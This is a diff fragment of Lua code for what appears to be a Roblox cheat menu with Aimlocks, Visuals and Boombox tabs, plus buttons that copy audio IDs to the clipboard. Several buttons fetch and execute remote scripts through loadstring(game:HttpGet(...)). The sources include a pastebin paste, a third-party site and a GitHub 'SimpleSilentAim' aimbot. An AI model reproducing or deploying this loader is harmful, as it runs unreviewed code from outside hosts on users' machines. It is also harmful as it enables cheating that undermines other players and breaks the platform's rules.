+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/wMwN5Ygu", true))()
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://avarixcommunity.com/scripts/remove.lua"))()
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Down:connect(function()
+    va.Parent.Parent.Maintab.Visible = false
+    va.Parent.Parent.PlayerTab.Visible = false
+    va.Parent.Parent.VisualsTab.Visible = false
+    va.Parent.Parent.AimlocksTab.Visible = true
+    va.Parent.Parent.BoomboxTab.Visible = false
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nosssa/NossLock/main/SimpleSilentAim"))()
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Down:connect(function()
+    va.Parent.Parent.Maintab.Visible = false
+    va.Parent.Parent.PlayerTab.Visible = false
+    va.Parent.Parent.VisualsTab.Visible = false
+    va.Parent.Parent.AimlocksTab.Visible = false
+    va.Parent.Parent.BoomboxTab.Visible = true
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    setclipboard("2473291459")
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    wait(0)
+    game.StarterGui:SetCore("SendNotification", {
+      Title = "Copied",
+      Text = "ID Has been copied",
+      icon = "http://www.roblox.com/asset/?id=8109580830",
+      Duration = "5"
+    })
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    setclipboard("1282952408")
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    wait(0)
+    game.StarterGui:SetCore("SendNotification", {
+      Title = "Copied",
+      Text = "ID Has been copied",
+      icon = "http://www.roblox.com/asset/?id=8109580830",
+      Duration = "5"
+    })
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    setclipboard("3214185935")
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    wait(0)
+    game.StarterGui:SetCore("SendNotification", {
+      Title = "Copied",
+      Text = "ID Has been copied",
+      icon = "http://www.roblox.com/asset/?id=8109580830",
+      Duration = "5"
+    })
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    setclipboard("538804066")
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    wait(0)
+    game.StarterGui:SetCore("SendNotification", {
+      Title = "Copied",
+      Text = "ID Has been copied",
+      icon = "http://www.roblox.com/asset/?id=8109580830",
+      Duration = "5"
+    })
+  end)
+end)()
